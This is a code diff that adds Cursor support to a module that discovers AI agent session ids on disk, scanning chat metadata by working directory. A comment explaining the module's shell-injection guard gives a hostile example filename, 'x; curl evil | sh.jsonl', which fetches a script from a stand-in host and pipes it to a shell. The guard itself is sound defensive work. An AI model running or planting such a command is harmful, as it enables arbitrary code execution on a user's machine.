@@ -2,22 +2,26 @@
  * Per-provider on-disk native session-id discovery (profile-env aware).
  *
  * Used as the fallback when no native id was captured into the DB (Codex /
- * Gemini / OpenCode have no push-capture hook), and to power the multi-provider
- * resume picker. Pure fs reads — no DB, no tmux.
+ * Gemini / OpenCode / Cursor have no push-capture hook), and to power the
+ * multi-provider resume picker. Pure fs reads — no DB, no tmux.
  *
  * Claude reuses the proven streaming parser in `claude-session-service.ts`
- * (keyed by `encodePath(cwd)`); the other providers use a generic "newest file
- * by mtime under the provider's home dir" heuristic. Per-provider behavior is
- * driven by the declarative registry, not inline branching.
+ * (keyed by `encodePath(cwd)`); Codex/Gemini/OpenCode use a generic "newest
+ * file by mtime under the provider's home dir" heuristic. Cursor scans the
+ * metadata-only CLI chat index and filters it by the requested cwd. Per-provider
+ * behavior is driven by the registry plus these storage-layout adapters.
  */
 
 import { runtimeJoin as join } from "@/lib/dynamic-fs";
 import { homedir } from "node:os";
-import { readdir, stat } from "node:fs/promises";
+import { readFile, readdir, stat } from "node:fs/promises";
 import type { AgentProviderType } from "@/types/session";
 import type { ResumableSessionSummary } from "@/types/agent-resume";
 import { getResumeSpec } from "./agent-resume-registry";
 import { listSessions } from "@/services/claude-session-service";
+import { createLogger } from "@/lib/logger";
+
+const log = createLogger("SessionIdDiscovery");
 
 /** One discovered native session id with its last-modified time. */
 export interface DiscoveredSessionId {
@@ -51,11 +55,11 @@ function stripExtension(name: string, exts: string[]): string {
 
 /**
  * [hgwo] Defense-in-depth: a discovered id (a readdir filename stem for
- * codex/gemini/opencode) is later typed into the shell prompt via
+ * codex/gemini/opencode/cursor) is later typed into the shell prompt via
  * `tmux send-keys -l <cmd>` + `C-m`, so a session file named e.g.
- * `x; curl evil | sh.jsonl` would inject a command. The discovery dir is the
- * user's own profile-isolated home (low likelihood), but we still reject any id
- * with shell-significant characters — only `[A-Za-z0-9._-]` is allowed. Claude's
+ * `x; curl evil | sh.jsonl` would inject a command. The discovery stores are
+ * user-writable (profile-scoped for some providers, shared for Cursor), so we
+ * reject any id with shell-significant characters — only `[A-Za-z0-9._-]` is allowed. Claude's
  * UUIDs and the providers' opaque ids pass; a non-matching id is skipped so the
  * caller relaunches FRESH instead of resuming with an unsafe id.
  */
@@ -63,6 +67,141 @@ const SAFE_SESSION_ID = /^[A-Za-z0-9._-]+$/;
 
 function isSafeSessionId(id: string): boolean {
   return id.length > 0 && SAFE_SESSION_ID.test(id);
+}
+
+/** Map without opening every file in a large chat index at once. */
+async function mapWithConcurrency<T, R>(
+  items: T[],
+  limit: number,
+  mapper: (item: T) => Promise<R>,
+): Promise<R[]> {
+  const results = new Array<R>(items.length);
+  let nextIndex = 0;
+  const worker = async () => {
+    while (nextIndex < items.length) {
+      const index = nextIndex++;
+      results[index] = await mapper(items[index]);
+    }
+  };
+  await Promise.all(
+    Array.from({ length: Math.min(limit, items.length) }, () => worker()),
+  );
+  return results;
+}
+
+/** Resolve Cursor's data root. CLI config overrides do not relocate chat data. */
+function resolveCursorDataDir(env: Record<string, string>): string {
+  if (env.CURSOR_DATA_DIR) return env.CURSOR_DATA_DIR;
+  return join(env.HOME ?? homedir(), ".cursor");
+}
+
+/** Whether a millisecond timestamp can be losslessly rendered as ISO. */
+function isValidDateMs(value: unknown): value is number {
+  return (
+    typeof value === "number" &&
+    Number.isFinite(value) &&
+    !Number.isNaN(new Date(value).getTime())
+  );
+}
+
+/**
+ * Cursor's CLI chat index stores metadata at:
+ *   <data>/chats/<workspace-hash>/<chat-id>/meta.json
+ *
+ * Workspace hashes are opaque, so discovery scans every bucket and uses the
+ * metadata's exact `cwd` to select this project. `hasConversation` excludes
+ * shell/IDE records that cannot be resumed as CLI conversations. We never load
+ * the adjacent `store.db` conversation bodies.
+ */
+async function listCursorSessionIds(
+  cwd: string,
+  env: Record<string, string>,
+  limit: number,
+): Promise<DiscoveredSessionId[]> {
+  const chatsDir = join(resolveCursorDataDir(env), "chats");
+
+  try {
+    // Workspace bucket names are opaque index keys and are never typed into a
+    // shell, so the chat-id injection guard must not filter them.
+    const workspaceBuckets = await readdir(chatsDir);
+    const perWorkspace = await mapWithConcurrency(
+      workspaceBuckets,
+      16,
+      async (workspaceBucket) => {
+        const workspaceDir = join(chatsDir, workspaceBucket);
+        try {
+          const chatIds = (await readdir(workspaceDir)).filter(isSafeSessionId);
+          return chatIds.map((sessionId) => ({ workspaceDir, sessionId }));
+        } catch {
+          return [];
+        }
+      },
+    );
+    const candidates = perWorkspace.flat();
+    const metadataEntries = await mapWithConcurrency(
+      candidates,
+      32,
+      async ({ workspaceDir, sessionId }) => {
+        const metadataPath = join(workspaceDir, sessionId, "meta.json");
+        try {
+          const parsed: unknown = JSON.parse(await readFile(metadataPath, "utf8"));
+          if (!parsed || typeof parsed !== "object") {
+            return { recognized: false, entry: null };
+          }
+
+          const metadata = parsed as Record<string, unknown>;
+          if (
+            typeof metadata.cwd !== "string" ||
+            typeof metadata.hasConversation !== "boolean"
+          ) {
+            return { recognized: false, entry: null };
+          }
+          if (metadata.cwd !== cwd || metadata.hasConversation !== true) {
+            return { recognized: true, entry: null };
+          }
+
+          const updatedAtMs =
+            isValidDateMs(metadata.updatedAtMs)
+              ? metadata.updatedAtMs
+              : isValidDateMs(metadata.createdAtMs)
+                ? metadata.createdAtMs
+                : (await stat(metadataPath)).mtimeMs;
+
+          if (!isValidDateMs(updatedAtMs)) {
+            return { recognized: true, entry: null };
+          }
+
+          return {
+            recognized: true,
+            entry: { sessionId, mtime: updatedAtMs },
+          };
+        } catch {
+          return { recognized: false, entry: null };
+        }
+      },
+    );
+
+    if (
+      candidates.length > 0 &&
+      metadataEntries.every((result) => !result.recognized)
+    ) {
+      log.warn("Cursor chat metadata was unreadable or had an unknown schema", {
+        candidateCount: candidates.length,
+      });
+    }
+
+    return metadataEntries
+      .map((result) => result.entry)
+      .filter((entry): entry is { sessionId: string; mtime: number } => entry !== null)
+      .sort((a, b) => b.mtime - a.mtime)
+      .map(({ sessionId, mtime }) => ({
+        sessionId,
+        lastModified: new Date(mtime).toISOString(),
+      }))
+      .slice(0, limit);
+  } catch {
+    return [];
+  }
 }
 
 /**
@@ -129,6 +268,10 @@ export async function listSessionIds(
       .filter((entry) => isSafeSessionId(entry.sessionId));
   }
 
+  if (provider === "cursor") {
+    return listCursorSessionIds(cwd, env, limit);
+  }
+
   return listDiskSessionIds(provider, env, limit);
 }
 
@@ -139,10 +282,10 @@ export async function listSessionIds(
  * `ResumableSessionSummary`. For Claude it preserves the `.jsonl`-derived
  * previews (`firstUserMessage`, `gitBranch`) so the picker looks exactly as it
  * did against the old Claude-only route. The disk-discovery providers
- * (codex/gemini/opencode) have no cheap preview, so those fields are omitted and
- * the UI degrades to id + timestamp. A provider with no on-disk store (or whose
- * dir is empty/unreadable) yields an empty list — the picker shows an empty
- * state rather than erroring.
+ * (codex/gemini/opencode/cursor) have no cheap preview, so those fields are
+ * omitted and the UI degrades to id + timestamp. A provider with no on-disk
+ * store (or whose dir is empty/unreadable) yields an empty list — the picker
+ * shows an empty state rather than erroring.
  */
 export async function listResumableSessions(
   provider: AgentProviderType,
@@ -161,6 +304,10 @@ export async function listResumableSessions(
         firstUserMessage: s.firstUserMessage,
         gitBranch: s.gitBranch,
       }));
+  }
+
+  if (provider === "cursor") {
+    return listCursorSessionIds(cwd, env, limit);
   }
 
   // Generic providers: id + timestamp only (no cheap on-disk preview).
